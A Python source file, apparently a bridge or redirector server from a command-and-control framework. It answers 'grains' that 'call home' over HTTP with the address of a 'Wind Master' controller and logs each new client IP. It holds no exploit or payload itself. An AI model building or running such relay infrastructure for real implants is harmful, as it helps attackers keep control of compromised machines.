from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import threading
import time
import sys

wm_addr = ''
wm_port = 0

# First in first out list
new_grains = []


def args_validation(ip_addr, port):
    if port.isdigit() and len(ip_addr.split('.')) == 4:
        for octat in ip_addr.split('.'):
            if not octat.isdigit():
                return False
        return True


def wakeup_execution():

    attempts_counter = 0

    while True:
        try:
            wake_response = wakeup_call()
            attempts_counter += 1
            if wake_response:
                print("[+] Confirmation received from Wind Master")
                break
            elif attempts_counter == 3:
                print("[!] Wakeup call failed - Maximum number of attempts")
                break
            else:
                time.sleep(5)
        except Exception as err:
            print("[!] Error while sending wakeup call: " + str(err))


def wakeup_call():
    global wm_addr, wm_port

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as wm_socket:
        try:
            wm_socket.connect((wm_addr, wm_port))
            wm_socket.send("new_grains_flag".encode())
            data = wm_socket.recv(1024)
            de_data = data.decode()
            if "awake" == de_data:
                print("[+] WindMaster waiting for new connections")
                return True
            else:
                print("[!] Response need to be handled")
                return False
        except Exception as err:
            print("[!] Error while awaking server: " + str(err))


class WelcomeHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        global wm_port, wm_addr, new_grains

        # Send response
        self.send_response(200)

        grain_ip = self.client_address[0]

        # Send headers
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.end_headers()

        # Response body
        self.wfile.write(str(wm_addr + ":" + str(wm_port)).encode())
        if grain_ip not in new_grains:
            print("[+] New grain called home: " + grain_ip)
            print("[*] Sending wakeup call, please wait..")
            #wakeup_thread = threading.Thread(target=wakeup_execution)
            #wakeup_thread.start()
            new_grains.append(grain_ip)
        else:
            print("[*] Grain already handled.")


if __name__ == '__main__':

    bridge_ip = ''
    bridge_port = ''

    if len(sys.argv) == 1:
        print("[!] Usage: python -m bridge_server.py HTTP_SERVER_IP HTTP_SERVER_PORT WM_IP WM_PORT")
        sys.exit()
    else:
        print("[*] Validating arguments...")
        if args_validation(sys.argv[1], sys.argv[2]) and args_validation(sys.argv[3], sys.argv[4]):
            wm_addr = sys.argv[3]
            wm_port = sys.argv[4]
            try:
                print("[+] HTTP Server is fired up")
                server_address = (sys.argv[1], int(sys.argv[2]))
                httpd = HTTPServer(server_address, WelcomeHandler)
                httpd.serve_forever()
            except Exception as err:
                print("[!] Error occurred while starting HTTP server: " + str(err))
